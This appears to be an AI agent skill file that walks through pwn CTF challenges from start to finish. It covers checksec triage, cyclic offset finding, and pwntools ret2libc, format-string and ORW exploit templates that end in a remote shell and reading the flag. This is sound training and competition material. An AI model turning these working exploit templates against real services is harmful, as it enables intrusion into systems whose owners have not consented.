---
name: pwn
description: Solve a binary-exploitation / pwn CTF challenge end to end — triage the binary, find the memory-corruption bug, and build a pwntools exploit that lands a shell and reads the flag. Use when given an ELF challenge binary (often with a libc and an nc host:port), or when the user mentions buffer overflow, ret2libc, ROP, format string, GOT overwrite, heap, or "get a shell".
---

# Solving a pwn challenge

A `pwn` challenge is a binary with a memory-corruption bug. You exploit it
locally, then fire the same exploit at the remote service to read its flag.
All tools below ship in the `ctf` profile.

## 1. Triage — know what you're attacking

```sh
file ./chall                       # arch, static/dynamic, stripped?
checksec --file=./chall            # NX, PIE, RELRO, stack canary  (from pwntools)
strings ./chall | grep -i flag     # easy wins, /bin/sh, format strings
```

Mitigations dictate technique:
- **No canary** → straight stack buffer overflow.
- **NX on** → can't run shellcode on the stack; use ROP / ret2libc.
- **No PIE** → code addresses are fixed; ROP gadgets are at static addresses.
- **PIE / ASLR** → you need an address *leak* first.
- **Partial/No RELRO** → GOT is writable; GOT-overwrite is on the table.

If a libc is provided, make the binary run against it so local == remote:

```sh
patchelf --set-interpreter ./ld-2.31.so \
         --replace-needed libc.so.6 ./libc-2.31.so ./chall
```

## 2. Find the bug & the offset

Read the disassembly/decompile (`r2 -A ./chall`, `radare2`, or `objdump -d`).
Look for `gets`, unbounded `read`/`scanf`, `printf(user_input)` (format
string), `system`, or `win`/`backdoor` functions. Find the overflow offset to
the saved return address with a cyclic pattern:

```python
from pwn import *
context.binary = elf = ELF('./chall')

io = process('./chall')
io.sendline(cyclic(200))
io.wait()
core = io.corefile
offset = cyclic_find(core.read(core.rsp, 8))   # bytes until saved RIP
log.info(f'offset = {offset}')
```

Or do it under GEF: `gdb ./chall`, `pattern create 200`, run, crash, then
`pattern search $rsp`.

## 3. Build the exploit

Start a pwntools template and iterate locally before going remote. Keep a
single `io = process(...)` / `remote(...)` switch so you flip to the server by
changing one line.

```python
from pwn import *

context.binary = elf = ELF('./chall')
libc = ELF('./libc-2.31.so')           # if provided
context.log_level = 'info'

def conn():
    if args.REMOTE:                    # run as: python xpl.py REMOTE
        return remote('host', 1337)
    return process(elf.path)           # or gdb.debug(elf.path, 'b *main')

io = conn()

offset = 40                            # from step 2
rop = ROP(elf)
```

Pick the chain by what you have:

- **`win()` function exists** → overflow, return to it.
  `payload = flat({offset: elf.symbols.win})`
- **ret2libc (leak first)** → leak a libc address from the GOT via `puts`,
  resolve libc base, return into `system("/bin/sh")` on a second trip:
  ```python
  rop.puts(elf.got.puts)
  rop.main()                                   # loop back for round 2
  io.sendline(flat({offset: rop.chain()}))
  io.recvline(); leak = u64(io.recvline().strip().ljust(8, b'\0'))
  libc.address = leak - libc.symbols.puts
  rop2 = ROP(libc)
  rop2.raw(rop2.ret)                           # stack alignment for movaps
  rop2.system(next(libc.search(b'/bin/sh\0')))
  io.sendline(flat({offset: rop2.chain()}))
  ```
- **one_gadget** (have libc base) → one ROP slot instead of a chain:
  `one_gadget ./libc-2.31.so` → pick a gadget whose constraints hold, return to it.
- **Format string** → `fmtstr_payload(offset, {elf.got.printf: elf.symbols.win})`.
- **seccomp sandbox** → `seccomp-tools dump ./chall` to see allowed syscalls;
  if `execve` is blocked, switch to an `open`/`read`/`write` ROP (ORW) chain.

End with:

```python
io.interactive()        # then: cat flag.txt
```

## 4. Land the shell, grab the flag

Run locally until `io.interactive()` gives a shell. Then re-run with `REMOTE`
and read the flag from the server. Print it explicitly so it's captured:

```sh
python xpl.py REMOTE
# in the shell:  cat flag.txt   /  ls /  /  find / -name 'flag*'
```

## Debugging tips

- `gdb ./chall` auto-loads **GEF**: `vmmap`, `telescope $rsp 20`,
  `heap chunks`, `got`, `checksec`, `pattern search`.
- Attach pwntools to a live GEF window: `io = gdb.debug(elf.path, 'b *main\nc')`.
- Stuck on a `system()` SIGSEGV inside libc → it's almost always stack
  alignment; add a bare `ret` gadget before the call (the `movaps` issue).
- Re-leak every run under ASLR; never hardcode a libc address across runs.
